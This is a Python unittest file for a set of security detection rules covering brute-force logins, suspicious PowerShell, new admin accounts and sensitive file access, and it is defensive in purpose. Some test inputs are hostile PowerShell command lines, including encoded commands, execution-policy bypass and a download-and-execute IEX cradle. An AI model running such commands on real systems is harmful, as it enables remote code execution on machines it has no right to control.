import unittest

from rules import (
    detect_auth_failures,
    detect_powershell,
    detect_privileged_account,
    detect_sensitive_access,
    detect_success_after_failures,
)


class DetectionRuleTests(unittest.TestCase):
    def test_bruteforce_threshold_is_five(self):
        events = [
            {"id": i, "timestamp": f"2026-10-08T07:0{i}:00+00:00", "event_type": "authentication", "status": "failure", "username": "a", "source_ip": "1.2.3.4", "host": "dc-01"}
            for i in range(1, 6)
        ]
        self.assertEqual(len(detect_auth_failures(events)), 1)

    def test_four_failures_do_not_alert(self):
        events = [
            {"id": i, "timestamp": f"2026-10-08T07:0{i}:00+00:00", "event_type": "authentication", "status": "failure", "username": "a", "source_ip": "1.2.3.4", "host": "dc-01"}
            for i in range(1, 5)
        ]
        self.assertEqual(detect_auth_failures(events), [])

    def test_success_after_failures(self):
        events = [
            {"id": 1, "timestamp": "2026-10-08T07:01:00+00:00", "event_type": "authentication", "status": "failure", "username": "a", "source_ip": "1.2.3.4", "host": "dc-01"},
            {"id": 2, "timestamp": "2026-10-08T07:02:00+00:00", "event_type": "authentication", "status": "failure", "username": "a", "source_ip": "1.2.3.4", "host": "dc-01"},
            {"id": 3, "timestamp": "2026-10-08T07:03:00+00:00", "event_type": "authentication", "status": "failure", "username": "a", "source_ip": "1.2.3.4", "host": "dc-01"},
            {"id": 4, "timestamp": "2026-10-08T07:04:00+00:00", "event_type": "authentication", "status": "success", "username": "a", "source_ip": "1.2.3.4", "host": "dc-01"},
        ]
        self.assertEqual(len(detect_success_after_failures(events)), 1)

    def test_powershell_requires_indicator(self):
        base = {"id": 1, "timestamp": "2026-10-08T07:01:00+00:00", "event_type": "process", "process_name": "powershell.exe", "host": "ws-01", "username": "a", "source_ip": "10.0.0.1"}
        benign = {**base, "command_line": "powershell.exe -NoProfile Get-Date"}
        suspicious = {**base, "command_line": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand AAA"}
        self.assertEqual(detect_powershell([benign]), [])
        self.assertEqual(len(detect_powershell([suspicious])), 1)

    def test_new_admin_account_is_correlated(self):
        events = [
            {"id": 1, "timestamp": "2026-10-08T10:00:00+00:00", "event_type": "account", "action": "created", "username": "newsvc", "host": "dc-01", "source_ip": "10.0.0.1"},
            {"id": 2, "timestamp": "2026-10-08T10:10:00+00:00", "event_type": "privilege", "action": "admin_granted", "username": "newsvc", "host": "dc-01", "source_ip": "10.0.0.1"},
        ]
        self.assertEqual(len(detect_privileged_account(events)), 1)

    def test_sensitive_access_outside_expected_host(self):
        event = {"id": 1, "timestamp": "2026-10-08T11:00:00+00:00", "event_type": "file_access", "action": "read", "username": "analyst02", "host": "ws-sales-07", "source_ip": "10.0.0.1", "target": "customer_export.csv"}
        self.assertEqual(len(detect_sensitive_access([event])), 1)


def _failures(user, ip, hour, count, first_id):
    return [
        {"id": first_id + i, "timestamp": f"2026-10-08T{hour}:0{i}:00+00:00", "event_type": "authentication", "status": "failure", "username": user, "source_ip": ip, "host": "dc-01"}
        for i in range(count)
    ]


class DetectionRegressionTests(unittest.TestCase):
    """Cases found during the audit: false positives and a missed second burst."""

    PS = {"id": 1, "timestamp": "2026-10-08T07:01:00+00:00", "event_type": "process", "process_name": "powershell.exe", "host": "ws-01", "username": "a", "source_ip": "10.0.0.1"}

    def ps(self, command):
        return detect_powershell([{**self.PS, "command_line": command}])

    def test_powershell_benign_lookalikes_do_not_alert(self):
        for command in (
            "powershell.exe -NoProfile Get-Content C:\\x.txt -Encoding UTF8",
            "powershell.exe -File bypass_report.ps1",
            "pwsh.exe -NoProfile -Command Get-Index",
        ):
            with self.subTest(command=command):
                self.assertEqual(self.ps(command), [])

    def test_powershell_real_indicators_and_abbreviations_alert(self):
        for command in (
            "powershell.exe -enc SQBFAFgA",
            "powershell.exe -e SQBFAFgA",
            "powershell.exe -EncodedCommand SQBFAFgA",
            "powershell.exe -ep bypass -File x.ps1",
            "powershell.exe -ExecutionPolicy Bypass -File x.ps1",
            "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"",
            "powershell.exe -Command \"[Convert]::FromBase64String($x)\"",
        ):
            with self.subTest(command=command):
                self.assertEqual(len(self.ps(command)), 1)

    def test_powershell_summary_does_not_repeat_indicators(self):
        summary = self.ps("powershell.exe -ExecutionPolicy Bypass -EncodedCommand AAA")[0].summary
        self.assertEqual(summary.count("EncodedCommand"), 1)

    def test_second_bruteforce_burst_against_another_account_is_detected(self):
        events = _failures("alice", "1.1.1.1", "07", 5, 1) + _failures("bob", "2.2.2.2", "09", 5, 100)
        detections = detect_auth_failures(events)
        self.assertEqual(sorted(d.username for d in detections), ["alice", "bob"])

    def test_one_long_burst_raises_one_alert(self):
        self.assertEqual(len(detect_auth_failures(_failures("alice", "1.1.1.1", "07", 9, 1))), 1)

    def test_failures_from_different_users_are_not_combined(self):
        events = _failures("alice", "1.1.1.1", "07", 3, 1) + _failures("bob", "1.1.1.1", "07", 3, 100)
        self.assertEqual(detect_auth_failures(events), [])

    def test_sensitive_access_from_expected_host_or_unmapped_user_does_not_alert(self):
        base = {"id": 1, "timestamp": "2026-10-08T11:00:00+00:00", "event_type": "file_access", "action": "read", "source_ip": "10.0.0.1", "target": "finance_forecast.xlsx"}
        self.assertEqual(detect_sensitive_access([{**base, "username": "analyst02", "host": "ws-fin-01"}]), [])
        self.assertEqual(detect_sensitive_access([{**base, "username": "unknown-user", "host": "ws-x"}]), [])

    def test_mitre_mappings_for_every_rule(self):
        from rules import RULES
        self.assertEqual(
            {rule_id: rule["mitre_technique"] for rule_id, rule in RULES.items()},
            {"AUTH-001": "T1110.001", "AUTH-002": "T1078", "PROC-001": "T1059.001", "IAM-001": "T1098", "DATA-001": "T1039"},
        )


if __name__ == "__main__":
    unittest.main()
